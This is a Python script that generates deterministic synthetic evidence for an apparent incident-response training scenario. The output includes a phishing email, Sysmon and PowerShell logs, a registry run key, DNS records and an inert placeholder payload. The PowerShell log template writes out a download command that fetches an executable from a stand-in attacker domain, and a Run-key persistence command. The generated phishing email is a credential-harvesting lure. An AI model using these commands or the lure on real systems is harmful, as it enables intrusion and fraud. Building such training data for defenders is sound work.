#!/usr/bin/env python3
"""BlackEcho evidence factory — deterministic synthetic incident evidence.

Generates the complete evidence set for Operation BlackEcho from a fixed
seed. All timestamps derive from the scenario clock (never wall-clock), so
identical runs produce byte-identical evidence.

Usage:
    python3 evidence_factory.py [--out evidence] [--seed 0xBEAC0]

Evidence map (see SCENARIO.md):
    email/invoice-phish.eml      Phishing email (PhishScope)
    email/invoice-logo.jpg       Attached image with EXIF (MetaTrace)
    endpoint/sysmon.xml          Sysmon XML: process chain (HuntForge)
    endpoint/powershell.xml      PowerShell events (HuntForge)
    endpoint/registry.json       Run key artifact (HuntForge)
    logs/host.jsonl              Host JSONL logs (LogLens)
    logs/app.jsonl               App logs with noise (LogLens)
    network/dns.jsonl            DNS observations (NetScope)
    pcap/incident.pcap           Synthetic PCAP (AegisForge)
    filesystem/svc-host-update.exe  Harmless placeholder (deterministic hash)
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
import struct
from datetime import datetime, timedelta, timezone
from email.message import EmailMessage
from email.utils import format_datetime
from pathlib import Path

# ---------------------------------------------------------------------------
# Deterministic scenario clock
# ---------------------------------------------------------------------------

T0 = datetime(2026, 9, 28, 8, 12, 0, tzinfo=timezone.utc)  # email sent
SEED = 0xBEAC0


def ts(minutes: float) -> str:
    """Scenario timestamp: minutes after T0, ISO-8601 UTC."""
    return (T0 + timedelta(minutes=minutes)).strftime("%Y-%m-%dT%H:%M:%SZ")


def rfc2822(minutes: float) -> str:
    return format_datetime(T0 + timedelta(minutes=minutes))


# ---------------------------------------------------------------------------
# Ground-truth constants (must match ground-truth/incident.json)
# ---------------------------------------------------------------------------

HOST = "WS-FINANCE-04"
USER = "finance.user"
USER_EMAIL = "finance.user@northstar-meridian.example"
ATTACKER_EMAIL = "billing@northstar-meridian-billing.example"
EVIL_DOMAIN = "invoice-portal-updates.example"
EVIL_IP = "203.0.113.44"
PAYLOAD_NAME = "svc-host-update.exe"
RUN_KEY = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SysHostUpdate"


# ---------------------------------------------------------------------------
# 1. Email
# ---------------------------------------------------------------------------

def build_email(rng: random.Random) -> bytes:
    msg = EmailMessage()
    msg["From"] = f'"Northstar Meridian Billing" <{ATTACKER_EMAIL}>'
    msg["To"] = f'"Finance Team" <{USER_EMAIL}>'
    msg["Subject"] = "Action required: Invoice NM-4471 overdue — update payment portal"
    msg["Date"] = rfc2822(0)
    msg["Message-ID"] = "<nm-4471-20260928@northstar-meridian-billing.example>"
    # Authentication: SPF softfail, DKIM none, DMARC fail — classic phish signals
    msg["Received"] = (
        "from mail.northstar-meridian-billing.example "
        "(unknown [198.51.100.23]) by mx.northstar-meridian.example "
        "with ESMTPS id q7B8K2mN42;"
        f" {rfc2822(2)}"
    )
    msg["Authentication-Results"] = (
        "mx.northstar-meridian.example; spf=softfail "
        "smtp.mailfrom=northstar-meridian-billing.example; "
        "dkim=none; dmarc=fail action=none "
        "header.from=northstar-meridian-billing.example"
    )
    body = f"""Dear Finance team,

Our records show invoice NM-4471 (Q3 services, $18,240.00) is now 14 days
overdue. To avoid late fees, please review the attached invoice and update
your payment details at our new vendor portal:

    https://{EVIL_DOMAIN}/portal/invoice/NM-4471

If the link does not work, reply to this email with your confirmation.

Best regards,
Accounts Receivable
Northstar Meridian Billing
"""
    msg.set_content(body)
    # Attach the invoice logo image (generated separately, attached by factory)
    return msg.as_bytes()


# ---------------------------------------------------------------------------
# 2. Endpoint — Sysmon XML
# ---------------------------------------------------------------------------

SYSMON_TEMPLATE = """<Events>
  <Event>
    <System><Provider Name="Microsoft-Windows-Sysmon" Guid="{{5770385F-C22A-43E0-BF4C-06F5698FFBD9}}"/><EventID>1</EventID><TimeCreated SystemTime="{t1}"/><Computer>{host}</Computer></System>
    <EventData>
      <Data Name="Image">C:\\Windows\\System32\\WINWORD.EXE</Data>
      <Data Name="ProcessId">4120</Data>
      <Data Name="User">{user}</Data>
      <Data Name="CommandLine">"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\finance.user\\Downloads\\Invoice_Q3_NM-4471.doc"</Data>
    </EventData>
  </Event>
  <Event>
    <System><Provider Name="Microsoft-Windows-Sysmon" Guid="{{5770385F-C22A-43E0-BF4C-06F5698FFBD9}}"/><EventID>1</EventID><TimeCreated SystemTime="{t2}"/><Computer>{host}</Computer></System>
    <EventData>
      <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="ProcessId">5344</Data>
      <Data Name="ParentImage">C:\\Windows\\System32\\WINWORD.EXE</Data>
      <Data Name="ParentProcessId">4120</Data>
      <Data Name="User">{user}</Data>
      <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\\Users\\finance.user\\AppData\\Local\\Temp\\inv-update.ps1"</Data>
    </EventData>
  </Event>
  <Event>
    <System><Provider Name="Microsoft-Windows-Sysmon" Guid="{{5770385F-C22A-43E0-BF4C-06F5698FFBD9}}"/><EventID>1</EventID><TimeCreated SystemTime="{t3}"/><Computer>{host}</Computer></System>
    <EventData>
      <Data Name="Image">C:\\Users\\finance.user\\AppData\\Local\\Temp\\{payload}</Data>
      <Data Name="ProcessId">6102</Data>
      <Data Name="ParentImage">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
      <Data Name="ParentProcessId">5344</Data>
      <Data Name="User">{user}</Data>
      <Data Name="CommandLine">"C:\\Users\\finance.user\\AppData\\Local\\Temp\\{payload}" --update</Data>
    </EventData>
  </Event>
  <Event>
    <System><Provider Name="Microsoft-Windows-Sysmon" Guid="{{5770385F-C22A-43E0-BF4C-06F5698FFBD9}}"/><EventID>13</EventID><TimeCreated SystemTime="{t4}"/><Computer>{host}</Computer></System>
    <EventData>
      <Data Name="EventType">SetValue</Data>
      <Data Name="TargetObject">{runkey}</Data>
      <Data Name="Details">C:\\Users\\finance.user\\AppData\\Local\\Temp\\{payload}</Data>
      <Data Name="User">{user}</Data>
    </EventData>
  </Event>
  <Event>
    <System><Provider Name="Microsoft-Windows-Sysmon" Guid="{{5770385F-C22A-43E0-BF4C-06F5698FFBD9}}"/><EventID>22</EventID><TimeCreated SystemTime="{t5}"/><Computer>{host}</Computer></System>
    <EventData>
      <Data Name="QueryName">{domain}</Data>
      <Data Name="QueryStatus">0</Data>
      <Data Name="QueryResults">{ip}</Data>
      <Data Name="Image">C:\\Users\\finance.user\\AppData\\Local\\Temp\\{payload}</Data>
      <Data Name="User">{user}</Data>
    </EventData>
  </Event>
  <Event>
    <System><Provider Name="Microsoft-Windows-Sysmon" Guid="{{5770385F-C22A-43E0-BF4C-06F5698FFBD9}}"/><EventID>3</EventID><TimeCreated SystemTime="{t6}"/><Computer>{host}</Computer></System>
    <EventData>
      <Data Name="Image">C:\\Users\\finance.user\\AppData\\Local\\Temp\\{payload}</Data>
      <Data Name="DestinationIp">{ip}</Data>
      <Data Name="DestinationPort">443</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="User">{user}</Data>
    </EventData>
  </Event>
</Events>
"""


def build_sysmon() -> str:
    return SYSMON_TEMPLATE.format(
        t1=ts(51), t2=ts(51.5), t3=ts(52), t4=ts(52.5), t5=ts(53), t6=ts(53.5),
        host=HOST, user=USER, payload=PAYLOAD_NAME,
        runkey=RUN_KEY, domain=EVIL_DOMAIN, ip=EVIL_IP,
    )


PS_TEMPLATE = """<Events>
  <Event>
    <System><Provider Name="Microsoft-Windows-PowerShell" Guid="{{A0C1853B-5C40-4B15-8766-3CF1C58F985A}}"/><EventID>4104</EventID><TimeCreated SystemTime="{t1}"/><Computer>{host}</Computer></System>
    <EventData>
      <Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadFile('https://{domain}/dl/upd', $env:TEMP + '\\{payload}')</Data>
      <Data Name="UserId">{user}</Data>
    </EventData>
  </Event>
  <Event>
    <System><Provider Name="Microsoft-Windows-PowerShell" Guid="{{A0C1853B-5C40-4B15-8766-3CF1C58F985A}}"/><EventID>4104</EventID><TimeCreated SystemTime="{t2}"/><Computer>{host}</Computer></System>
    <EventData>
      <Data Name="ScriptBlockText">Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SysHostUpdate' -Value "$env:TEMP\\{payload}"</Data>
      <Data Name="UserId">{user}</Data>
    </EventData>
  </Event>
</Events>
"""


def build_powershell() -> str:
    return PS_TEMPLATE.format(
        t1=ts(51.7), t2=ts(52.3), host=HOST, user=USER,
        domain=EVIL_DOMAIN, payload=PAYLOAD_NAME,
    )


def build_registry_artifact(payload_sha256: str) -> dict:
    return {
        "artifact": "registry-run-key",
        "host": HOST,
        "key": RUN_KEY,
        "value": f"C:\\Users\\{USER}\\AppData\\Local\\Temp\\{PAYLOAD_NAME}",
        "first_seen": ts(52.5),
        "payload_sha256": payload_sha256,
        "technique": "T1547.001",
    }


# ---------------------------------------------------------------------------
# 3. Logs (JSONL)
# ---------------------------------------------------------------------------

def build_host_logs(rng: random.Random) -> list[dict]:
    events = []
    # Malicious: PowerShell launch + persistence around t=51-53
    events.append({
        "timestamp": ts(51.5), "host": HOST, "user": USER,
        "source": "sysmon", "level": "info",
        "message": f"Process created: powershell.exe (parent: WINWORD.EXE, pid 5344)",
    })
    events.append({
        "timestamp": ts(52.5), "host": HOST, "user": USER,
        "source": "sysmon", "level": "warning",
        "message": f"Registry value set: {RUN_KEY}",
    })
    # Noise: normal activity
    noise = [
        (30, "info", "User logon: finance.user (workstation logon)"),
        (35, "info", "Office autosave completed: Q3-report.xlsx"),
        (40, "info", "Software update check: no updates available"),
        (45, "info", "Browser: navigated to intranet.northstar-meridian.example"),
        (55, "info", "User logon: admin (scheduled maintenance)"),
        (58, "error", "Print spooler: paper jam on PRN-02 (unrelated)"),
        (60, "info", "Antivirus scan completed: 0 threats"),
        (65, "info", "User logoff: finance.user"),
    ]
    for minutes, level, message in noise:
        events.append({
            "timestamp": ts(minutes), "host": HOST, "user": USER,
            "source": "host", "level": level, "message": message,
        })
    # Duplicate event (tests dedup tolerance)
    events.append({
        "timestamp": ts(51.5), "host": HOST, "user": USER,
        "source": "sysmon", "level": "info",
        "message": "Process created: powershell.exe (parent: WINWORD.EXE, pid 5344)",
    })
    events.sort(key=lambda e: e["timestamp"])
    return events


def build_app_logs(rng: random.Random) -> list[dict]:
    events = []
    base_messages = [
        "Invoice service: processed batch INV-2026-09-28-A (42 invoices)",
        "Payment gateway: heartbeat OK (latency 41ms)",
        "Auth service: 3 failed logins for vendor-portal (rate-limited)",
        "Email gateway: flagged 1 message (invoice-phish.eml, score 8.7)",
        "Backup job: completed successfully (2.1 GB)",
    ]
    for i, message in enumerate(base_messages):
        events.append({
            "timestamp": ts(20 + i * 9), "host": "SRV-APP-01",
            "source": "app", "level": "info" if i != 2 else "warning",
            "message": message,
        })
    # Anomaly: repeated errors (tests LogLens burst detection)
    for i in range(6):
        events.append({
            "timestamp": ts(54 + i * 0.4), "host": "SRV-APP-01",
            "source": "app", "level": "error",
            "message": "Payment gateway: upstream timeout (invoice-portal-updates.example)",
        })
    events.sort(key=lambda e: e["timestamp"])
    return events


# ---------------------------------------------------------------------------
# 4. Network — DNS observations
# ---------------------------------------------------------------------------

def build_dns_observations(rng: random.Random) -> list[dict]:
    obs = [
        {"timestamp": ts(53), "host": HOST, "query": EVIL_DOMAIN,
         "qtype": "A", "answers": [EVIL_IP], "note": "malicious"},
        {"timestamp": ts(53.2), "host": HOST, "query": EVIL_DOMAIN,
         "qtype": "AAAA", "answers": [], "note": "malicious"},
        # Noise
        {"timestamp": ts(44), "host": HOST, "query": "intranet.northstar-meridian.example",
         "qtype": "A", "answers": ["10.20.30.5"], "note": "benign"},
        {"timestamp": ts(46), "host": HOST, "query": "update.microsoft.com",
         "qtype": "A", "answers": ["20.81.111.100"], "note": "benign"},
        {"timestamp": ts(61), "host": HOST, "query": "mail.northstar-meridian.example",
         "qtype": "MX", "answers": ["10.20.30.10"], "note": "benign"},
    ]
    return obs


# ---------------------------------------------------------------------------
# 5. Filesystem placeholder
# ---------------------------------------------------------------------------

def build_payload_placeholder() -> bytes:
    # Harmless deterministic placeholder. NOT executable code.
    return (
        b"BLACKECHO-SYNTHETIC-PLACEHOLDER\x00"
        b"This file stands in for the incident payload. It is inert text.\n"
        b"Incident: BLACKECHO-001. Do not execute.\n"
    )


# ---------------------------------------------------------------------------
# Manifest
# ---------------------------------------------------------------------------

def sha256_file(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="evidence")
    ap.add_argument("--seed", default="0xBEAC0")
    args = ap.parse_args()

    seed = int(args.seed, 16) if args.seed.startswith("0x") else int(args.seed)
    rng = random.Random(seed)
    out = Path(args.out)

    # Text evidence
    (out / "email" / "invoice-phish.eml").write_bytes(build_email(rng))
    (out / "endpoint" / "sysmon.xml").write_text(build_sysmon(), encoding="utf-8")
    (out / "endpoint" / "powershell.xml").write_text(build_powershell(), encoding="utf-8")
    payload = build_payload_placeholder()
    payload_sha = hashlib.sha256(payload).hexdigest()
    (out / "filesystem" / PAYLOAD_NAME).write_bytes(payload)
    (out / "endpoint" / "registry.json").write_text(
        json.dumps(build_registry_artifact(payload_sha), indent=2), encoding="utf-8")
    (out / "logs" / "host.jsonl").write_text(
        "\n".join(json.dumps(e) for e in build_host_logs(rng)) + "\n", encoding="utf-8")
    (out / "logs" / "app.jsonl").write_text(
        "\n".join(json.dumps(e) for e in build_app_logs(rng)) + "\n", encoding="utf-8")
    (out / "network" / "dns.jsonl").write_text(
        "\n".join(json.dumps(e) for e in build_dns_observations(rng)) + "\n", encoding="utf-8")

    # Binary evidence (generated deterministically at runtime)
    from binary_gen import build_jpeg_with_exif, build_pcap
    (out / "email" / "invoice-logo.jpg").write_bytes(build_jpeg_with_exif(rng))
    (out / "pcap" / "incident.pcap").write_bytes(build_pcap())

    # Manifest
    manifest = {"generated_at": ts(0), "seed": hex(seed), "files": {}}
    for path in sorted(out.rglob("*")):
        if path.is_file():
            rel = str(path.relative_to(out))
            manifest["files"][rel] = {
                "sha256": sha256_file(path),
                "size_bytes": path.stat().st_size,
            }
    (out / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")

    # Ground-truth enrichment: fill in deterministic hashes
    gt_path = Path("ground-truth/incident.json")
    if gt_path.exists():
        gt = json.loads(gt_path.read_text(encoding="utf-8"))
        gt["indicators"] = {
            "domain": EVIL_DOMAIN,
            "ip": EVIL_IP,
            "payload_sha256": payload_sha,
            "payload_filename": PAYLOAD_NAME,
            "note": "documentation-range / controlled test values only",
        }
        gt_path.write_text(json.dumps(gt, indent=2), encoding="utf-8")

    print(f"evidence written to {out}/ ({len(manifest['files'])} files)")


if __name__ == "__main__":
    main()
